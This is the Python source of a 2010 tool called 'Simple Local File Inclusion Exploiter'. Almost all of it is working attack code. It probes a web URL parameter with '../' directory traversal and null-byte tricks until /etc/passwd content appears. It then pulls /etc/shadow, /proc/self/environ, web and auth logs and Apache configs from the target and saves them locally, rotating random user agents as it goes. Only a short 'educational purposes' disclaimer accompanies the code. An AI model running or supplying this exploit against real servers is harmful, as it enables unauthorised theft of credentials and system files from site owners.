#!/usr/bin/python

# Simple Local File Inclusion Exploiter, version 1.2
# by Valentin Hoebel (valentin@xenuser.org)

# ASCII FOR BREAKFAST

# ---------- [Description]
# This tool helps you to exploit LFI (Local File Inclusion) vulnerabilities.
# After you found a LFI vulnerability simply pass the affected URL
# and vulnerable parameter to this tool.
# You can also use this tool to scan a URL for LFI vulnerabilities.

# ---------- [Features]
# - This time with working random user agents ^_^
# - Checks if a connection to the target can be established
# - Some error handling
# - Scans a parameter of a URL for a LFI vulnerability
# - Finds out how a LFI vulnerability can be exploited (e.g. directory depth)
# - Supports nullbytes
# - Dumps a list of interesting files (e.g. /etc/passwd and logs) to the hard disk
# - Supports common *nix targets, but no Windows systems.
# - Creates a small log file.
# Supports no SEO URLs, such as www.example.com/local-news/
# But in most cases it is possible to find out the real URL and pass it to this script.

# ---------- [Usage example]
# ./lfi_sploiter.py --exploit-url="http://www.example.com/page.php?url=main" --vulnerable-parameter="url"
# The tool then assumes that the parameter "url" is vulnerable and attacks the target.
# When you do not know which parameter is vulnerable simply try one parameter after another,
# this tool will scan the parameter and tell you if it is vulnerable :) But only pass one parameter at once!

# ---------- [Known issues]
# - I know there is more about LFI than it is covered in this tool. But this is the first release,
#   and more features will be implemented in future versions.
# - This tool is only able to handle "simple" LFI vulnerabilities, but not complex ones.
#   For example: Some LFI vulnerabilities consist of two URL parameters or require to 
#   find a way around filters. In those cases, this tool unfortunately does not work.
# - Like most other LFI exploiter / scanner, this tool here also has problems with
#   handling certain server responses. So this tool does not work with every website.

# ---------- [Tested with]
# Targets: Apache2 servers and PHP websites, various Linux systems
# Script platform: Ubuntu Lucid Lynx and Python 2.6.5

# ---------- [Notes]
# - This tool was developed using a Python 2.6.5 interpreter.
# - I admit: This tool is a little bit slow and not very efficient (too many variables etc.). Sorry about that :P
# - Modify, distribute, share and copy this code in any way you like!
# - Please note that this tool was created and published for educational purposes only, e.g. for pentesting
#   your own website. Do not use it in an illegal way and always know + respect your local laws.
#   I am not responsible if you cause any damage with it.

# ---------- [Changelog]
# - Version 1.2 (05th December 2010):
#  - Added some more "interesting files"
#
# - Version 1.1 (23th November 2010): 
#   - Added new log file <domain name>-details.txt which contains some information about the current scan
#   - Added some more "interesting files"
#   - Added some more user agents
#
# - Version 1.0 (21th November 2010):
#    - Initial release

# Power to the cows!

import getopt,  sys,  random,  urllib,  urllib2,  httplib,  re,  string,  os
from urllib2 import Request,  urlopen,  URLError,  HTTPError
from urlparse import urlparse
from time import gmtime, strftime
 
def print_usage(): 
    print_banner()
    print "[!] Wrong argument and parameters passed. Use --help and learn how to use this tool :)"
    print "[i] Hint: You need to pass a value for --exploit-url=\"<value>\" and --vulnerable-parameter=\"<value>\"."
    print "[i] Example: ./lfi_sploiter.py --exploit-url=\"http://www.example.com/page.php?file=main\" --vulnerable-parameter=\"file\" "
    print ""
    print ""
    sys.exit()
    return
    
def print_help():
    print_banner()
    print "((Displaying the content for --help.))"
    print ""
    print "[Description]"
    print "The Simple Local File Inclusion Exploiter helps you to"
    print "exploit LFI vulnerabilities. After you found one, simply"
    print "pass the URL of the affected website and the vulnerable"
    print "parameter to this tool. You can also use this tool"
    print "to scan a parameter of an ULR for a LFI vulnerability."
    print ""
    print "[Usage]"
    print "./lfi_sploiter.py --exploit-url=\"<URL with http://>\" --vulnerable-parameter=\"<parameter>\""
    print ""
    print "[Usage example]"
    print "./lfi_sploiter.py --exploit-url=\"http://www.example.com/page.php?file=main\" --vulnerable-parameter=\"file\" "
    print ""
    print "[Usage notes]"
    print "- Always use http://...."
    print "- When you pass a vulnerable parameter, this tool assumes that it is really vulnerable."
    print "- If you do not know if a parameter is vulnerable, simply pass it to this script and let the scanner have a look."
    print "- Only use one vulnerable parameter at once."
    print "- This tool does not work with SEO URLs, such as http://www.example.com/news-about-the-internet/."
    print "  If you only have a SEO URL, try to find out the real URL which contents parameters."
    print ""
    print "[Feature list]"
    print "- Provides a random user agent for the connection."
    print "- Checks if a connection to the target can be established."
    print "- Tries catch most errors with error handling. "
    print "- Contains a LFI scanner (only scans one parameter at once)."
    print "- Finds out how a LFI vulnerability can be exploited (e.g. directory depth)."
    print "- Supports nullbytes!"
    print "- Exploit features: Dumps a list of interesting files to your hard disk."
    print "- Supports common *nix targets, but no Windows systems."
    print "- Creates a small log file."
    print ""
    print "[Some notes]"
    print "- Tested with Python 2.6.5."
    print "- Modify, distribute, share and copy the code in any way you like!"
    print "- Please note that this tool was created for educational purposes only."
    print "- Do not use this tool in an illegal way. Know and respect your local laws."
    print "- Only use this tool for legal purposes, such as pentesting your own website :)"
    print "- I am not responsible if you cause any damage or break the law."
    print "- Power to teh c0ws!"
    print ""
    print ""
    sys.exit()
    return
    
def print_banner():
    print ""
    print ""
    print ""
    print "Simple Local File Inclusion Exploiter"
    print "by Valentin Hoebel (valentin@xenuser.org)"
    print ""
    print "Version 1.2 (05th December 2010)  ^__^"
    print "                                  (oo)\________"
    print "                                  (__)\        )\/\ "
    print "                                      ||----w |"
    print "Power to teh cows!                    ||     ||"
    print "____________________________________________________"
    print ""
    return

def test_url(exploit_url):
    print ""
    print "[i] Assuming the provided data was correct."
    print "[i] Trying to establish a connection with a random user agent..."
    
    user_agents = [
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",   
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01 ",  
                            "Opera/8.00 (Windows NT 5.1; U; en)",  
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19 "
                          ]
    user_agent = random.choice (user_agents)
    check=""
    
    request_website = urllib2.Request(exploit_url)
    request_website.add_header('User-Agent', user_agent)
    
    try:
        check = urllib2.urlopen(request_website)
    except HTTPError,  e:
        print "[!] The connection could not be established."
        print "[!] Error code: ",  e
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit(1)
    except URLError, e:
        print "[!] The connection could not be established."
        print "[!] Reason: ",  e
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit(1)
    else:
        print "[i] Connected to target! URL seems to be valid."
        print "[i] Jumping to the exploit feature."
    return 
    

def exploit_lfi(exploit_url,  vulnerable_parameter):
    print ""
    
    # Define all variables of this function
    # I know, there are more efficient ways of handling all the "problems" we encounter later in this script,
    # but well, I am still learning ;)
    lfi_found = 0
    param_equals = "="
    param_sign_1 = "?"
    param_sign_2 = "&"
    nullbyte = "%00"
    one_step_deeper = "../"
    for_the_first_test = "/"
    for_changing_the_dump_file_name = "_"
    for_the_second_test = ".."
    max_depth = 20
    i = 0
    nullbyte_required = 1
    depth = 0
    original_vulnerable_parameter_value = ""
    query_string = ""
    modified_query_string = ""
    lfi_url_part_one = ""
    lfi_url_part_two = ""
    lfi_url_part_three = ""
    lfi_url_part_four = ""
    lfi_url = ""
    find_nasty_string = "root:x:0:0:"
    find_nasty_string_2 = "mail:x:8:"
    user_agents = [
                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8", 
                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre", 
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)", 
                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)", 
                            "Mozilla/3.01 (Macintosh; PPC)", 
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",   
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
                            "Opera/8.00 (Windows NT 5.1; U; en)",  
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                          ]
    user_agent = random.choice (user_agents)
    lfi_response=""
    lfi_response_source_code = ""
    replace_string = ""
    replace_string_2 = ""
    replace_me = ""
    value_for_vulnerable_parameter = ""
    value_for_vulnerable_parameter_2 = ""
    exploit_depth= 0
    folder_name = ""
    cd_into = ""
    change_dump_filename = ""
    log_file_name = ""
    
    # I know, some of these are rarely accessible for the webserver, but you never know... it is worth the try!
    # Never ever change the first line!
    local_files = [
                        "etc/passwd", 
                        "proc/self/environ", 
                        "var/log/apache2/access.log", 
                        "var/log/apache2/access_log", 
                        "var/log/apache2/error.log", 
                        "var/log/apache2/error_log",
                        "var/log/httpd/access.log", 
                        "var/log/httpd/access_log", 
                        "var/log/httpd/error.log", 
                        "var/log/httpd/error_log",
                        "var/log/nginx/access.log",
                        "var/log/nginx/access_log",
                        "var/log/nginx/error.log",
                        "var/log/nginx/error_log",
                        "etc/shadow", 
                        "etc/group", 
                        "var/log/auth.log", 
                        "proc/self/status", 
                        "proc/self/mounts", 
                        "proc/cpuinfo", 
                        "proc/meminfo", 
                        "etc/apache2/httpd.conf", 
                        "etc/apache2/apache2.conf", 
                        "etc/apache2/envvars"
                       ]
    
    # We have to split up the URL in order to replace the value of the vulnerable parameter
    get_parsed_url = urlparse(exploit_url)
    print "[i] For exploiting the LFI vulnerability we need to split the URL into its parts."
    print "[i] IP address / domain: " + get_parsed_url.netloc

    if len(get_parsed_url.path) == 0:
        print "[!] The URL doesn't contain a script (e.g. target/index.php)."
    else:
        print "[i] Script:",  get_parsed_url.path
    if len(get_parsed_url.query) == 0:
        print "[!] The URL doesn't contain a query string (e.g. index.php?var1=x&controller=main)."
    else:
        print "[i] URL query string:",  get_parsed_url.query
        print ""

    # Finding all URL parameters
    if param_sign_1 in exploit_url and param_equals in exploit_url:
        print "[i] It seems that the URL contains at least one parameter."
        print "[i] Trying to find also other parameters..."
        
        # It seems that there is at least one parameter in the URL. Trying to find out if there are also others...
        if param_sign_2 in get_parsed_url.query and param_equals in get_parsed_url.query:
            print "[i] Also found at least one other parameter in the URL."
        else:
            print "[i] No other parameters were found."
            
    else:
        print ""
        print "[!] It seems that there is no parameter in the URL."
        print "[!] How am I supposed to find a vulnerability?"
        print "[!] Please provide an URL with a script and query string."
        print "[!] Example: target/index.php?cat=1&article_id=2&controller=main"
        print "[!] Hint: I can't handle SEO links, so try to find an URL with a query string."
        print "[!] This can most likely be done by having a look at the source code (rightclick -> show source code in your browser)."
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit(1)
    
    # Detect the parameters
    # Thanks to atomized.org for the URL splitting and parameters parsing part!
    parameters = dict([part.split('=') for part in get_parsed_url[4].split('&')])

    # Count the parameters
    parameters_count = len(parameters)
    
    # Print the parameters and store them in single variables
    print "[i] The following", parameters_count, "parameter(s) was/were found:"
    print "[i]",  parameters
    
    # Check if the URL contains the provided vulnerable parameter
    print ""
    print "[i] According to you, the vulnerable parameter should be: " + vulnerable_parameter
    print "[i] Checking if this parameter exists in the provided URL..."
    
    if vulnerable_parameter in get_parsed_url.query:
        print "[i] Found your vulnerable parameter in the URL."
    else:
        print "[!] I was not able to find your vulnerable parameter within the provided URL."
        print "[!] How am I supposed to exploit the LFI vulnerabililty then?"
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit(1)
    
    # We now try to find out how this LFI vulnerability can be exploited
    # a) How deep do we need to go (../../......) and b) do we need to use the nullbyte? =)
    # We find this out by trying to access the /etc/passwd file.. it should always be accessible.
    print ""
    print "[i] Now trying to find out how this LFI vulnerability can be exploited..."
    print "[i] This can take a while."
    
    value_for_vulnerable_parameter = for_the_first_test
    value_for_vulnerable_parameter += value_for_vulnerable_parameter.join(local_files[0:1])
    value_for_vulnerable_parameter_2 = "".join(local_files[0:1])
    value_for_vulnerable_parameter_with_nullbyte = value_for_vulnerable_parameter + nullbyte
    value_for_vulnerable_parameter_with_nullbyte_2 = value_for_vulnerable_parameter_2 + nullbyte
   
    query_string = get_parsed_url.query
   # Find out what value the vulnerable parameter currently has
    for key, value in parameters.items():
        if key == vulnerable_parameter:
            # Save the value of the vulnerable parameter, so we later can search in in the URL
            original_vulnerable_parameter_value = value
    
    # Our main routine, maybe the most important part of this script
    # At first without the nullbyte
    for depth in range(i, max_depth):
        # Replace the default value of the vulnerable parameter with our LFI string
        replace_string = (depth * one_step_deeper) + value_for_vulnerable_parameter_2
        replace_string_2 = vulnerable_parameter + param_equals + (depth * one_step_deeper) + value_for_vulnerable_parameter_2
        if depth== 0:
            replace_string = (depth * one_step_deeper) + value_for_vulnerable_parameter
            replace_string_2 = vulnerable_parameter + param_equals + (depth * one_step_deeper)  + value_for_vulnerable_parameter
            
        replace_me = vulnerable_parameter + param_equals + original_vulnerable_parameter_value
        modified_query_string = query_string.replace(replace_me,  replace_string_2)
        
        # Now craft the URL
        lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
        lfi_url_part_two = "".join(get_parsed_url[1:2]) 
        lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
        lfi_url_part_four = "".join(modified_query_string)  
        lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
                
        # Ok, everything is prepared to enter subspace.. eeh, to call the URL (Stargate fans get this joke!)
        request_website = urllib2.Request(lfi_url)
        request_website.add_header('User-Agent', user_agent)
    
        try:
            lfi_response = urllib2.urlopen(request_website)
        except URLError,  e:
            print "[!] The connection could not be established."
            print "[!] Reason: ",  e
        else:
            lfi_response_source_code = lfi_response.read()
            if find_nasty_string in lfi_response_source_code:
                print "[+] Found signs of a successfull LFI vulnerability! No nullbyte was required."
                print "[+] URL: " + lfi_url
                nullbyte_required = 0
                lfi_found  = 1
                exploit_depth = depth
                break
            else:
                if find_nasty_string_2 in lfi_response_source_code:
                    print "[+] Found signs of a successfull LFI vulnerability! No nullbyte was required." 
                    print "[+] URL: " + lfi_url
                    nullbyte_required = 0
                    lfi_found  = 1
                    exploit_depth = depth
                    break
             
    if nullbyte_required == 1:
        # Now with the nullbyte
        for depth in range(i, max_depth):
            # Replace the default value of the vulnerable parameter with our LFI string
            replace_string = (depth * one_step_deeper) + value_for_vulnerable_parameter_with_nullbyte_2
            replace_string_2 = vulnerable_parameter + param_equals + (depth * one_step_deeper)  + value_for_vulnerable_parameter_with_nullbyte_2
            if depth== 0:
                replace_string = (depth * one_step_deeper) + value_for_vulnerable_parameter_with_nullbyte
                replace_string_2 = vulnerable_parameter + param_equals + (depth * one_step_deeper) + value_for_vulnerable_parameter_with_nullbyte
            
            replace_me = vulnerable_parameter + param_equals + original_vulnerable_parameter_value
            modified_query_string = query_string.replace(replace_me,  replace_string_2)
        
            # Now craft the URL
            lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
            lfi_url_part_two = "".join(get_parsed_url[1:2]) 
            lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
            lfi_url_part_four = "".join(modified_query_string)  
            lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
            
            # Ok, everything is prepared to enter subspace.. eeh, to call the URL (Stargate fans get this joke!)
            request_website = urllib2.Request(lfi_url)
            request_website.add_header('User-Agent', user_agent)
    
            try:
                lfi_response = urllib2.urlopen(request_website)
            except URLError,  e:
                print "[!] The connection could not be established."
                print "[!] Reason: ",  e
            else:
                lfi_response_source_code = lfi_response.read()
                if find_nasty_string in lfi_response_source_code:
                    print "[+] Found signs of a successfull LFI vulnerability! Using the nullbyte was necessary."
                    print "[+] URL: " + lfi_url
                    lfi_found  = 1
                    exploit_depth = depth
                    break
                else:
                    if find_nasty_string_2 in lfi_response_source_code:
                        print "[+] Found signs of a successfull LFI vulnerability! Using the nullbyte was necessary."
                        print "[+] URL: " + lfi_url
                        lfi_found  = 1
                        exploit_depth = depth
                        break

    if lfi_found == 0:
        print "[!] The LFI vulnerability could not be detected."
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit()
    
    # Now that we know the details of the LFI vulnerability, we can start to exploit it.
    # At first we try to dump all interesting files to your local hard disk
    print ""
    print "[i] Exploiting the LFI vulnerability starts right now."
    print "[i] Trying to dump some interesting files to your local hard disk..."

    # "Craft" the folder name, it contains the scanned website and a formatted timestamp
    folder_name = get_parsed_url.netloc + "_-_" + strftime("%d_%b_%Y_%H:%M:%S_+0000", gmtime())
    
    # Create the folder, with some error handling
    try:
        os.mkdir(folder_name)
    except OSError:
        print "[!] Something is wrong, the folder could not be created. Check the chmod and chown permissions!"
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit(1)

    cd_into =  os.getcwd() + "/" + folder_name + "/"
    os.chdir(cd_into)

    # New since version 1.1: Create a small log file
    log_file_name = folder_name + "_-_scan.log"
    FILE = open(log_file_name,  "w")
    FILE.write("Simple Local File Inclusion Exploiter - Log File\n")
    FILE.write("----------------------------------------------------------\n\n")
    FILE.write("Exploited URL:\n")
    FILE.write(exploit_url + "\n\n")
    FILE.write("LFI URL:\n")
    FILE.write(lfi_url)
    FILE.close

    # Start "calling" the files. Yeeeha!
    for key,  file in enumerate(local_files):        
        # Craft the URL
        # Consider nullbyte usage...
        if nullbyte_required == 0:
            # Consider that the LFI can be exploited by the first try and that no "cd .."s are needed.
            # Yes, sometimes this works! For example in my test script :P So this code block has a right to exist, believe it or not =)
            replace_string = (exploit_depth * one_step_deeper) + file
            replace_string_2 = vulnerable_parameter + param_equals + (exploit_depth * one_step_deeper) + file
            if exploit_depth == 0:
                replace_string = (exploit_depth * one_step_deeper) + for_the_first_test + file
                replace_string_2 = vulnerable_parameter + param_equals + (exploit_depth * one_step_deeper)  + for_the_first_test + file
            
            replace_me = vulnerable_parameter + param_equals + original_vulnerable_parameter_value
            modified_query_string = query_string.replace(replace_me,  replace_string_2)
        
            lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
            lfi_url_part_two = "".join(get_parsed_url[1:2]) 
            lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
            lfi_url_part_four = "".join(modified_query_string)  
            lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
                     
            request_website = urllib2.Request(lfi_url)
            request_website.add_header('User-Agent', user_agent)
            
            try:
                lfi_response = urllib2.urlopen(request_website)
            except URLError,  e:
                print "[!] The connection could not be established."
                print "[!] Reason: ",  e
            else:
                lfi_response_source_code = lfi_response.read()
                
                # Dump the file
                # We need to replace the "/" with underscores
                change_dump_filename = file.replace(for_the_first_test,  for_changing_the_dump_file_name)
                print "[+] Dumping file: " + for_the_first_test + file
                FILE = open(change_dump_filename,  "w")
                FILE.write(lfi_response_source_code )
                FILE.close

        elif nullbyte_required == 1:
            # Consider that the LFI can be exploited by the first try and that no "cd .."s are needed.
            # Yes, sometimes this works! For example in my test script :P So this code block has a right to exist, believe it or not =)
            replace_string = (exploit_depth * one_step_deeper) + file + nullbyte
            replace_string_2 = vulnerable_parameter + param_equals + (exploit_depth * one_step_deeper) + file + nullbyte
            if exploit_depth == 0:
                replace_string = (exploit_depth * one_step_deeper) + for_the_first_test + file + nullbyte
                replace_string_2 = vulnerable_parameter + param_equals + (exploit_depth * one_step_deeper) + for_the_first_test + file + nullbyte
            
            replace_me = vulnerable_parameter + param_equals + original_vulnerable_parameter_value
            modified_query_string = query_string.replace(replace_me,  replace_string_2)
        
            lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
            lfi_url_part_two = "".join(get_parsed_url[1:2]) 
            lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
            lfi_url_part_four = "".join(modified_query_string)  
            lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
        
            request_website = urllib2.Request(lfi_url)
            request_website.add_header('User-Agent', user_agent)
            
            try:
                lfi_response = urllib2.urlopen(request_website)
            except URLError,  e:
                print "[!] The connection could not be established."
                print "[!] Reason: ",  e
            else:
                lfi_response_source_code = lfi_response.read()
                
                # Dump the file
                # We need to replace the "/" with underscores
                change_dump_filename = file.replace(for_the_first_test,  for_changing_the_dump_file_name)
                print "[+] Dumping file: " + for_the_first_test + file
                FILE = open(change_dump_filename,  "w")
                FILE.write(lfi_response_source_code )
                FILE.close
                    
    print "[i] Hint: The files are also dumped when we have no permission to view them." 
    print "[i] Instead of the file, the PHP error message will be dumped."
    
    print ""
    print "[i] Completed the task. Will now exit!"
    print "[i] A small log file was created."
    print "[i] I know, there is more about LFI than it is covered here, but this will be implemented in later versions of this tool."
    print "[i] Feel free to send in some feedback!"
    print ""
    print""
    sys.exit(1)
    
    return

def main(argv):
    exploit_url=""
    vulnerable_parameter=""
    
    try:
        opts,  args = getopt.getopt(sys.argv[1:],  "",  ["help",  "exploit-url=",  "vulnerable-parameter="])
    except getopt.GetoptError   :
        print_usage()
        sys.exit(2)
    
    for opt,  arg in opts:
        if opt in ("--help"):
            print_help()
            break
            sys.exit(1)
        elif opt in ("--exploit-url") :
            exploit_url=arg
            
        elif opt in ("--vulnerable-parameter"):
            vulnerable_parameter=arg
            
    if len(exploit_url) < 1:
        print_usage()
        sys.exit()
        
    if len(vulnerable_parameter) < 1:
        print_usage()
        sys.exit()
    
    # Continue if all required arguments were passed to the script.
    print_banner()
    print "[i] Provided URL to exploit: " + exploit_url
    print "[i] Provided vulnerable parameter: " + vulnerable_parameter
    
    # Check if URL is 
    test_url(exploit_url)

    # Calling the LFI exploit function
    exploit_lfi(exploit_url,  vulnerable_parameter)

if __name__ == "__main__":
    main(sys.argv[1:])
    
### EOF ###
